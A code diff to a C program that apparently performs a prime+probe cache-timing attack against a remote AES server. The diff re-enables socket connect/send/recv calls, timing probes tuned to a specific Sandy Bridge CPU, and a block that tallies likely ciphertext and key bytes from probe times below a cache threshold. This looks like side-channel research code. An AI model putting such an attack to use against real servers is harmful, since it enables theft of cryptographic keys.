@@ -72,7 +72,7 @@ int main(int argc, char* argv[])
 
     for (count = 0; count < CIPHERTEXTS; ++count) {
 
-        //min_prob_time = 99999999;
+        min_prob_time = 99999999;
 
         //for (i = 0; i < 16; ++i) {
         //    message[i] = (unsigned char)rand()%256;
@@ -80,23 +80,23 @@ int main(int argc, char* argv[])
 
 
         for (i = 0; i < REPS; ++i) {
-            //socket_desc = socket(AF_INET, SOCK_STREAM, 0);
-            //if (socket_desc == -1) { printf("Could not create socket\n"); return 1; } //printf("socket_desc: %d\n", socket_desc);
+            socket_desc = socket(AF_INET, SOCK_STREAM, 0);
+            if (socket_desc == -1) { printf("Could not create socket\n"); return 1; } //printf("socket_desc: %d\n", socket_desc);
             
             //Connect to remote server
-            //if (connect(socket_desc , (struct sockaddr *)&server , sizeof(server)) < 0) { printf("connection error\n"); return 1; } //printf("Connected\n");
+            if (connect(socket_desc , (struct sockaddr *)&server , sizeof(server)) < 0) { printf("connection error\n"); return 1; } //printf("Connected\n");
 
             //printf("sandybridge_i5_2435m_prime\n");
             sandybridge_i5_2435m_prime_m2(); //return 0;
             //printf("sandybridge_i5_2435m_reprime\n");
             sandybridge_i5_2435m_reprime_m2();
 
-            //if( send(socket_desc , message , 16 , 0) < 0) { puts("Send failed"); return 1; }
-            //if( recv(socket_desc, server_reply , 16 , 0) < 0) { puts("recv failed"); return 1; }
+            if( send(socket_desc , message , 16 , 0) < 0) { puts("Send failed"); return 1; }
+            if( recv(socket_desc, server_reply , 16 , 0) < 0) { puts("recv failed"); return 1; }
 
-            //x += F[1024];
+            //x += F[0];
             //printf("sandybridge_i5_2435m_probe\n");
-            prob_time = sandybridge_i5_2435m_probe_m2(); printf("\n%lu\n", prob_time); return 0;
+            prob_time = sandybridge_i5_2435m_probe_m2(); printf("%lu\n", prob_time); //return 0;
 
             //if (prob_time < 360) 
             //    printf("prob_time\t:\t%d\n", prob_time);
@@ -105,11 +105,11 @@ int main(int argc, char* argv[])
                 min_prob_time = prob_time;
             }
 
-            //close(socket_desc);
+            close(socket_desc);
 
         }
 
-        /*
+        
         // if min probe time is less than a threshold increase counters for specific ciphertext
         for (i = 0; i < 16; ++i) {
             if (min_prob_time < EMPIRICAL_CACHE_ACCESS_TIME) {
@@ -124,7 +124,7 @@ int main(int argc, char* argv[])
             //printf("Run %d\n\n", count / 10000);
             //possible_key_space(X);
         }
-        */
+        
         
     }
 
